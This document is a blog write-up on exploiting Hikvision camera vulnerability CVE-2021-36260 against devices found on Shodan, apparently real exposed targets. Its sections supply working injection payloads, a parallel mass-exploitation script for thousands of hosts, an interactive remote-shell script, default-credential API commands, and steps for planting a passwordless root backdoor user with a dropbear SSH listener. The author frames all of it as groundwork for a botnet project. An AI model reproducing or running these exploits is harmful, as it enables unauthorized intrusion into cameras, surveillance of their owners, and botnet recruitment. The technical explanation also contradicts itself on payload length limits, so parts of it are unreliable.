---
title: Hikvision CVE-2021-36260 - RCE to Persistent Access
date: 2025-07-26 14:54:00 +/-TTTT
image:
  path: assets/img/favicons/cam.jpg
  class: "img-right"
categories: [CyberSecurity]
tags: [iot, web, researching]  
---

# Hikvision CVE-2021-36260: RCE to Persistent Access

***
## Introduction

In this write-up, I document the technical exploitation of Hikvision's unauthenticated RCE vulnerability CVE-2021-36260, affecting devices running firmware version 3.1.3_150324. The attack vector exploits a command injection flaw in the `/SDK/webLanguage` endpoint where the `davinci` HTTP server passes unsanitized XML `<language>` tag content directly into `snprintf()` and subsequently `system()` calls, allowing arbitrary shell command execution as root. After identifying exposed targets via Shodan queries, I developed custom exploitation tooling: a Bash-based interactive shell wrapper that automates the two-step inject-and-retrieve process, a parallel scanner for mass vulnerability testing across thousands of IP:PORT pairs, and device enumeration scripts for extracting system information (`/proc/cpuinfo`, network configs, process lists). The research extends to establishing persistent access by injecting minimal user entries into `/etc/passwd` within the 22-character payload constraint, then spawning dropbear SSH instances for stable shell access. This technical walkthrough covers the complete exploitation lifecycle—from initial reconnaissance and payload crafting to automated scanning and post-exploitation persistence—demonstrating practical offensive security techniques against real-world embedded systems in a controlled research environment.
***

## HikvisionExploiter

Last year, I developed a Python tool ([HikvisionExploiter](https://github.com/tamim1089/HikvisionExploiter)) that’s worth mentioning as the foundational starting point for the RCE2Botnet project. It automates scanning and exploiting Hikvision devices running the vulnerable web interface firmware version `3.1.3_150324` (CVE-2021-36260). The tool processes a list of IP:port targets, checks for accessible snapshot directories to confirm unauthenticated access, then downloads timestamped snapshots to build a visual profile. It extracts device and user information by parsing XML responses from specific API endpoints, and retrieves the encrypted configuration file—decrypting it using AES-ECB and XOR methods—to reveal internal settings and credentials. Built-in CVE checks with various header and payload bypasses quickly identify exploitable devices. With support for batch targets, detailed logging, and graceful interruption handling, this tool laid the groundwork for automating mass reconnaissance and validation of remote code execution, critical steps toward building the RCE2Botnet infrastructure.

***

## Explaining [CVE-2021-36260](https://github.com/advisories/GHSA-v276-9v2g-hx55)

This vulnerability comes down to a classic case of poor input validation right inside Hikvision’s proprietary HTTP server binary often referred to as _davinci_. Researchers reverse‑engineered firmware and discovered that when handling a `PUT /SDK/webLanguage` call, the server reads the `<language>` XML element and plugs that string directly into a C `snprintf` call whose format string is `/dav/%s.tar.gz`. That buffer is only 31 bytes long, including fixed overhead, so anything longer gets truncated or overflows, or worse, if validation is missing, you can craft a payload like `$(ls /)` inside the `<language>` and it becomes part of a shell invocation via `system()`. That’s where unauthenticated hacker lands root shell access.

Digging into how the target firmware pieces behave, engineers found the code path: `davinci` calls `snprintf(buf, 0x1f, "/dav/%s.tar.gz", user_input)` then later builds a tar command like `/bin/sh -c tar zxf buf -C /home/`. If you inject payload content into `user_input`, `system()` executes it. Some firmware variations limit input to shorter length but others observed in the wild allow more space. That inconsistency explains why exploits sometimes need fuzzing around size boundaries. ([NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-36260?utm_source=chatgpt.com), [watchfulip.github.io](https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html?utm_source=chatgpt.com)). From the reverse engineering of Moobot’s downloader stage, analysts saw that once RCE is triggered, the attacker crafts a tiny ARM ELF binary (32‑bit LSB) called `downloader`. Its job is to fetch a larger Moobot implant from a remote HTTP server, verify it by printing “RAY” on success, then execute it with parameter `hikivision`. The downloader self‑cleans any existing “macHelper” file, drops the new one, and even aliases common commands like `reboot` to disable device recovery attempts.

***

### Find Targets on Shodan :  `3.1.3.150324`&#x20;

Using the Shodan query `3.1.3.150324` filters devices exposing the Hikvision web interface running firmware version `3.1.3_150324`, which is part of the vulnerable range affected by [CVE-2021-36260](https://github.com/advisories/GHSA-v276-9v2g-hx55). This version reflects the internal web server (`/SDK/webLanguage`) known to be exploitable due to command injection. Devices matching this string are strong candidates for successful RCE.

<figure><img src="https://4146235939-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FVsJVX5kOfAZOe1840NhZ%2Fuploads%2FGWourVA6YK36rYbjYSy2%2Fimage.png?alt=media&#x26;token=e96b2c01-b5bb-4395-b6a4-5263e0dfbe9e" alt=""><figcaption></figcaption></figure>

### Second Option For Shodan ( More General ) : `hikvision`&#x20;

***


## Exposed APIs

**Hikvision devices expose an undocumented but widely reverse engineered HTTP API**, used by their web interface, mobile apps, and some SDKs. You can absolutely interact with it from the CLI using tools like `curl`. These APIs, known as **ISAPI**, operate over plain HTTP(S) and return XML (or JSON on newer firmware). Most endpoints require **basic or digest auth** and respond with structured device control logic.

***

### Authentication

Default auth:

```bash
curl -u admin:12345 http://<ip>/ISAPI/System/deviceInfo
```

Some endpoints may use **digest auth**:

```bash
curl --digest -u admin:12345 http://<ip>/ISAPI/Security/users
```

***

### Example Interactions

#### Get Device Info

```bash
curl -u admin:12345 http://<ip>/ISAPI/System/deviceInfo
```

#### Reboot Device

```bash
curl -u admin:12345 -X PUT http://<ip>/ISAPI/System/reboot
```

#### List Users

```bash
curl -u admin:12345 http://<ip>/ISAPI/Security/users
```

#### Change Admin Password

```bash
curl -u admin:12345 -X PUT http://<ip>/ISAPI/Security/users/1 -d '
<User>
  <id>1</id>
  <userName>admin</userName>
  <password>NewStrongPassword</password>
</User>'
```

#### Get Snapshot (JPEG)

```bash
curl -u admin:12345 http://<ip>/ISAPI/Streaming/channels/1/picture
```

#### Live Event Stream (Motion, Alerts)

```bash
curl -u admin:12345 http://<ip>/ISAPI/Event/notification/alertStream
```

***

### API Endpoint Reference

<table><thead><tr><th>Function</th><th width="112.45458984375">Method</th><th>Endpoint</th><th>Notes</th></tr></thead><tbody><tr><td>Get device info</td><td>GET</td><td><code>/ISAPI/System/deviceInfo</code></td><td>Model, firmware, serial</td></tr><tr><td>Reboot device</td><td>PUT</td><td><code>/ISAPI/System/reboot</code></td><td>Admin only</td></tr><tr><td>List users</td><td>GET</td><td><code>/ISAPI/Security/users</code></td><td>Returns full user list</td></tr><tr><td>Modify user</td><td>PUT</td><td><code>/ISAPI/Security/users/&#x3C;id></code></td><td>XML payload</td></tr><tr><td>Get snapshot</td><td>GET</td><td><code>/ISAPI/Streaming/channels/1/picture</code></td><td>Image stream, snapshot mode</td></tr><tr><td>Event stream</td><td>GET</td><td><code>/ISAPI/Event/notification/alertStream</code></td><td>Multipart XML + JPEG</td></tr><tr><td>Get interfaces</td><td>GET</td><td><code>/ISAPI/System/Network/interfaces</code></td><td>Network config</td></tr><tr><td>Firmware upgrade</td><td>PUT</td><td><code>/ISAPI/System/updateFirmware</code> (upload <code>.dav</code>)</td><td>Needs firmware binary</td></tr><tr><td>ISP mode control</td><td>PUT</td><td><code>/ISAPI/Image/channels/1/ISPMode</code></td><td>For switching day/night</td></tr><tr><td>ANPR trigger</td><td>GET</td><td><code>/ISAPI/Traffic/MNPR/channels/1?laneNo=1&#x26;OSD=1</code></td><td>License plate capture</td></tr></tbody></table>

***

### Tips

* Endpoints return **XML** by default. Use `-H "Accept: application/xml"` for clarity.
* Unauthorized? Try both basic and digest auth. Some firmwares toggle between them.
* Discover endpoints by sniffing traffic with Burp or browser dev tools when using the web interface.

***


## RCE Thru Curl :

Initial exploitation began by selecting targets from Shodan search results using the query `3.1.3.150324`, which yields Hikvision devices exposing the vulnerable `/SDK/webLanguage` endpoint. A crafted HTTP `PUT` request was sent with `Content-Type: application/x-www-form-urlencoded; charset=UTF-8`, injecting command execution payloads via XML input like `<?xml version="1.0"?><language>$(COMMAND)</language>`, exploiting the unsanitized input processing in CVE-2021-36260. Successful execution was verified by chaining the payload with a subsequent `curl` request to retrieve command output (e.g., dumping `/etc/passwd`, `ifconfig`, or directory listings) from a predictable location (`/webLib/x`) on the target, confirming unauthenticated RCE on multiple devices.

### Basic Enumerating On a random target:

```bash
 ╭─hex@space in repo: HikvisionExploiter on  main [!?] via  v3.13.5 took 0s
 ╰─λ curl -s -X PUT "http://IP:82/SDK/webLanguage" \
           -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
           --data '<?xml version="1.0" encoding="UTF-8"?><language>$(cat /etc/passwd > webLib/x)</language>' \
           > /dev/null && curl -s "http://IP:82/x"

root:$1$yi$R2PYdRrGOlLVVIaehmYwl.:0:0:root:/root/:/bin/sh
admin:$1$yi$R2PYdRrGOlLVVIaehmYwl.:0:0:root:/:/bin/sh

 ╭─hex@space in repo: HikvisionExploiter on  main [!?] via  v3.13.5 took 1s
 ╰─λ curl -s -X PUT "http://IP:82/SDK/webLanguage" \
           -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
           --data '<?xml version="1.0" encoding="UTF-8"?><language>$(ifconfig > webLib/x)</language>' \
           > /dev/null && curl -s "http://IP:82/x"

eth0      Link encap:Ethernet  HWaddr 28:57:BE:5E:0E:7F  
          inet addr:192.168.1.65  Bcast:192.168.1.255  Mask:255.255.255.0
          inet6 addr: fe80::2a57:beff:fe5e:e7f/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:8908 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3616931 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:1329113 (1.2 MiB)  TX bytes:981880399 (936.3 MiB)
          Interrupt:12 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.255.255.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:270 errors:0 dropped:0 overruns:0 frame:0
          TX packets:270 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:16926 (16.5 KiB)  TX bytes:16926 (16.5 KiB)


 ╭─hex@space in repo: HikvisionExploiter on  main [!?] via  v3.13.5 took 1s
 ╰─λ curl -s -X PUT "http://IP:82/SDK/webLanguage" \
           -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
           --data '<?xml version="1.0" encoding="UTF-8"?><language>$(ls / > webLib/x)</language>' \
           > /dev/null && curl -s "http://IP:82/x"

bin
dav
dev
devinfo
etc
home
init
lib
linuxrc
mnt
opt
proc
root
sbin
srv
sys
tmp
var

 ╭─hex@space in repo: HikvisionExploiter on  main [!?] via  v3.13.5 took 6s
 ╰─λ curl -s -X PUT "http://IP:82/SDK/webLanguage" \
           -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
           --data '<?xml version="1.0" encoding="UTF-8"?><language>$(cat /proc/version > webLib/x)</language>' \
           > /dev/null && curl -s "http://IP:82/x"

Linux version 3.0.8 (huangliangyf2@Cpl-Frt-BSP) #1 Fri Mar 20 20:52:46 CST 2015

 ╭─hex@space in repo: HikvisionExploiter on  main [!?] via  v3.13.5 took 4s
 ╰─λ curl -s -X PUT "http://IP:82/SDK/webLanguage" \
           -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
           --data '<?xml version="1.0" encoding="UTF-8"?><language>$(cat /proc/cpuinfo > webLib/x)</language>' \
           > /dev/null && curl -s "http://IP:82/x"

Processor	: ARM926EJ-S rev 5 (v5l)
BogoMIPS	: 218.72
Features	: swp half thumb fastmult edsp java 
CPU implementer	: 0x41
CPU architecture: 5TEJ
CPU variant	: 0x0
CPU part	: 0x926
CPU revision	: 5

Hardware	: r2
Revision	: 0000
Serial		: 0000000000000000

 ╭─hex@space in repo: HikvisionExploiter on  main [!?] via  v3.13.5 took 5s
 ╰─λ 

 
```

***

## Automation For Testing vulnerability

As we have a list of 3500 hosts, it would be insanity to test it manually, so we will use an automation optimized for speed bash script to test the vulnerable ones.

```bash
#!/bin/bash

# function to process each IP:PORT
process_host() {
    local IP=$1
    local PORT=$2
    
    echo "Trying $IP:$PORT"

    # inject payload
    if curl -s -m 5 -X PUT "http://$IP:$PORT/SDK/webLanguage" \
        -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
        --data '<?xml version="1.0" encoding="UTF-8"?><language>$(cat /etc/passwd > webLib/x)</language>' \
        > /dev/null 2>&1; then
        echo "  Payload sent successfully to $IP:$PORT"
    else
        echo "  Payload timeout/error for $IP:$PORT"
    fi

    # try to retrieve the dumped file
    response=$(curl -s -m 3 "http://$IP:$PORT/x" 2>/dev/null)
    if [ -n "$response" ]; then
        echo "  Retrieved data from $IP:$PORT:"
        echo "Injecting Backdoor..."
        echo "$response"
    else
        echo "  No data retrieved from $IP:$PORT (timeout/no file)"
    fi
    echo ""
}

# export the function so its available to subshells
export -f process_host

# read all IP:PORT pairs and run them in parallel
while IFS=: read -r IP PORT; do
    # Run each host processing in background
    process_host "$IP" "$PORT" &
done < pizza.txt

# wait for all background processes to complete
wait

echo "all scans completed"
```

#### Automated Bash One Liner for grepping the clear results from the XML non-sense

```bash
./final.sh | grep "root:" -B 2 -A 1 > finalvulnerablercehosts.txt
```

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3a252331-8324-44ef-b916-2eed22c9d6d6" />


***
## Developing a Stable Shell

After confirming RCE across multiple targets, the next step was building a stable interactive shell interface. The challenge with blind command injection is you can't see output in real-time - each command requires two HTTP requests: one to inject the payload and write output to a file, another to retrieve that file. To streamline this workflow, I wrote a Bash script that automates the exploit loop, checks vulnerability status on connect, and provides a pseudo-interactive shell experience. The script validates the target format, performs a quick vulnerability test by injecting `echo test>webLib/test` and checking if the output file exists, then drops into a command loop where each input is injected via the `/SDK/webLanguage` endpoint and results are fetched from `/out`. It handles edge cases like blank input and local `clear` commands, while color-coding output for readability. This turns a clunky two-step manual process into a seamless shell interface that feels almost like SSH, despite running entirely over HTTP exploitation.

```bash
#!/bin/bash

# Colors
CYAN="\033[96m"
GREEN="\033[92m"
RED="\033[91m"
RESET="\033[0m"

if [[ -z "$1" ]]; then
    echo -e "${RED}Usage: $0 <ip:port>${RESET}"
    exit 1
fi

# Ensure argument contains :
if [[ "$1" != *:* ]]; then
    echo -e "${RED}Error: You must specify in the format ip:port (e.g., 10.10.10.10:80)${RESET}"
    exit 1
fi

TARGET="$1"

# Quick vulnerability check
curl -s -m 5 -X PUT "http://$TARGET/SDK/webLanguage" \
     -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
     --data "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>\$(echo test>webLib/test)</language>" >/dev/null

check=$(curl -s "http://$TARGET/test")

if [[ "$check" != "test" ]]; then
    echo -e "${RED}[-] Target $TARGET is NOT vulnerable to CVE-2021-36260${RESET}"
    exit 1
fi

echo -e "${GREEN}[+] Target $TARGET appears vulnerable!${RESET}"
echo -e "${CYAN}Connected to Hikvision target: $TARGET${RESET}"
echo -e "${CYAN}Type commands to execute remotely. Ctrl+C to exit.${RESET}"

# Interactive shell
while true; do
    # Prompt
    read -p "$(echo -e "${CYAN}hikvision-shell>${RESET} ")" cmd
    
    # Skip blank input
    [[ -z "$cmd" ]] && continue
    
    # Local clear
    if [[ "$cmd" == "clear" ]]; then
        clear
        continue
    fi
    
    # Execute command remotely
    curl -s -m 5 -X PUT "http://$TARGET/SDK/webLanguage" \
         -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
         --data "<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>\$($cmd > webLib/out)</language>" >/dev/null
    
    output=$(curl -s "http://$TARGET/out")
    
    if [[ -n "$output" ]]; then
        echo -e "${GREEN}${output}${RESET}"
    else
        echo -e "${RED}(no output)${RESET}"
    fi
done
```

**Example session output:**

```bash
HikvisionExploiter on  main [⇣] via C v13.3.0-gcc via ☕ v21.0.9 via 🐍 v3.12.3 took 2m19s 
❯ ./shell.sh 192.168.1.65:82

[+] Target 192.168.1.65:82 appears vulnerable!
Connected to Hikvision target: 192.168.1.65:82
Type commands to execute remotely. Ctrl+C to exit.

hikvision-shell> help
Built-in commands:
------------------
	. : [ [[ alias bg break cd chdir command continue echo eval exec
	exit export false fg getopts hash help jobs kill let local printf
	pwd read readonly return set shift source test times trap true
	type ulimit umask unalias unset wait
hikvision-shell> uname -a
Linux DVR 3.0.8 #1 Fri Mar 20 20:52:46 CST 2015 armv5tejl GNU/Linux
hikvision-shell> cat /proc/cpuinfo
Processor	: ARM926EJ-S rev 5 (v5l)
BogoMIPS	: 218.72
Features	: swp half thumb fastmult edsp java 
CPU implementer	: 0x41
CPU architecture: 5TEJ
CPU variant	: 0x0
CPU part	: 0x926
CPU revision	: 5

Hardware	: r2
Revision	: 0000
Serial		: 0000000000000000

hikvision-shell> ls  
applib
base.ko
initrun.sh
pidfile
process
r2_isp_config
smart_config.ko
sound
watch.ko
webLib
hikvision-shell> pwd
/home
hikvision-shell>
hikvision-shell> ps
  PID USER       VSZ STAT COMMAND
    1 admin     1376 S    init
    2 admin        0 SW   [kthreadd]
    3 admin        0 SW   [ksoftirqd/0]
    5 admin        0 SW   [kworker/u:0]
    6 admin        0 RW   [rcu_kthread]
    7 admin        0 SW<  [khelper]
    8 admin        0 SW   [sync_supers]
    9 admin        0 SW   [bdi-default]
   10 admin        0 SW<  [kblockd]
   11 admin        0 SW   [khubd]
   12 admin        0 SW<  [cfg80211]
   14 admin        0 SW<  [rpciod]
   15 admin        0 RW   [kswapd0]
   16 admin        0 SWN  [ksmd]
   17 admin        0 SW   [fsnotify_mark]
   18 admin        0 SW<  [nfsiod]
   19 admin        0 SW<  [crypto]
   32 admin        0 SW   [mtdblock0]
   33 admin        0 SW   [mtdblock1]
   34 admin        0 SW   [mtdblock2]
   35 admin        0 SW   [mtdblock3]
   36 admin        0 SW   [mtdblock4]
   37 admin        0 SW   [mtdblock5]
   38 admin        0 SW   [mtdblock6]
   39 admin        0 SW   [kworker/u:1]
   61 admin      928 S <  /sbin/udevd -d
  152 admin     1256 S    /sbin/dropbear -R -I 1800
  159 admin      824 S    /bin/network_deamon -d 0x0e -r 0x00 -t 60
  219 admin        0 SWN  [jffs2_gcd_mtd6]
  300 admin        0 DW   [mark_mergeable]
  301 admin     1040 S    /bin/execSystemCmd
  303 admin     7236 S    /home/process/daemon_fsp_app
  307 admin    14416 S    /home/process/database_process
  308 admin    23524 S    /home/process/net_process
  325 admin     1520 S    -/bin/psh
  327 admin     230m S <  /home/davinci
  602 admin        0 RW   [RTW_CMD_THREAD]
  703 admin        0 SW   [cifsd]
  710 admin        0 SW   [flush-cifs-1]
 3248 admin        0 SW   [kworker/0:1]
 3298 admin        0 SW   [kworker/0:0]
 3329 admin     1372 S    /bin/sh -c rm /home/webLib/doc/i18n/$(ps > webLib/ou
 3330 admin     1376 R    ps
hikvision-shell> ^C

HikvisionExploiter on  main [⇣] via C v13.3.0-gcc via ☕ v21.0.9 via 🐍 v3.12.3 took 2m19s 
❯ 

```

***
## Establishing Persistent SSH Access via Dropbear

Process enumeration revealed `dropbear` running on the device - a lightweight SSH server commonly found in embedded systems. The process list showed `/sbin/dropbear -R -I 1800` listening, which meant SSH infrastructure was already present but likely restricted to admin credentials we didn't have. The exploit's 22-character command length limitation became the critical constraint here. To backdoor SSH access, we needed to inject a new user into `/etc/passwd` with a valid shell, but the standard `useradd` or `adduser` commands weren't available in the busybox environment, and manually crafting a passwd entry with proper salt/hash would exceed the character limit. The solution was creating a minimalist passwd entry using `echo` redirection - specifically, a user with no password (blank hash field between colons) would allow login, then immediately setting a password post-connection. However, even `echo user::0:0::/:/bin/sh>>/etc/passwd` is 35 characters. The workaround involved breaking it into two commands: first writing the username and UID fields to a temp file, then appending shell path, then concatenating to passwd. After testing payload lengths, the most reliable method was using a short username (3-4 chars), writing incrementally via multiple injections, then restarting dropbear to pick up the new user. Once the user existed in `/etc/passwd`, SSH connection was established on the default dropbear port or a custom one if we injected `dropbear -p <port>` as a blind command.

**Creating the backdoor user:**

```bash
hikvision-shell> echo -n h::0:0:>t
(no output)

hikvision-shell> echo :/:/bin/sh>>t
(no output)

hikvision-shell> cat t>>/etc/passwd
(no output)

hikvision-shell> cat /etc/passwd
root:$1$yi$R2PYdRrGOlLVVIaehmYwl.:0:0:root:/root/:/bin/sh
admin:$1$yi$R2PYdRrGOlLVVIaehmYwl.:0:0:root:/:/bin/sh
h::0:0::/:/bin/sh

hikvision-shell> dropbear -p 2222
(no output)
```

**Connecting via SSH:**

```bash
❯ ssh h@192.168.1.65 -p 2222
The authenticity of host '[192.168.1.65]:2222 ([192.168.1.65]:2222)' can't be established.
RSA key fingerprint is SHA256:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.1.65]:2222' (RSA) to the list of known hosts.


BusyBox v1.19.4 (2015-03-20 20:44:37 CST) built-in shell (ash)
Enter 'help' for a list of built-in commands.

# whoami
h
# id
uid=0(root) gid=0(root)
# uname -a
Linux DVR 3.0.8 #1 Fri Mar 20 20:52:46 CST 2015 armv5tejl GNU/Linux
# 
```

The blank password field (`::`) in the passwd entry allows passwordless login, granting immediate root access since UID 0 was assigned. From here, full device control is achieved - persistent across reboots if the passwd modification survives (depends on whether `/etc` is on read-write or tmpfs), and significantly more stable than HTTP-based command injection loops.
***

### Resources Used :

* [https://seclists.org/fulldisclosure/2017/Sep/23](https://seclists.org/fulldisclosure/2017/Sep/23)
* [https://cxsecurity.com/issue/WLB-2024040061](https://cxsecurity.com/issue/WLB-2024040061)
* [https://busybox.net/downloads/BusyBox.html](https://busybox.net/downloads/BusyBox.html)
* [https://github.com/tamim1089/HikvisionExploiter/](https://github.com/tamim1089/HikvisionExploiter/)
* [https://www.fortinet.com/blog/threat-research/mirai-based-botnet-moobot-targets-hikvision-vulnerability](https://www.fortinet.com/blog/threat-research/mirai-based-botnet-moobot-targets-hikvision-vulnerability)
* [https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-36260.yaml](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-36260.yaml)
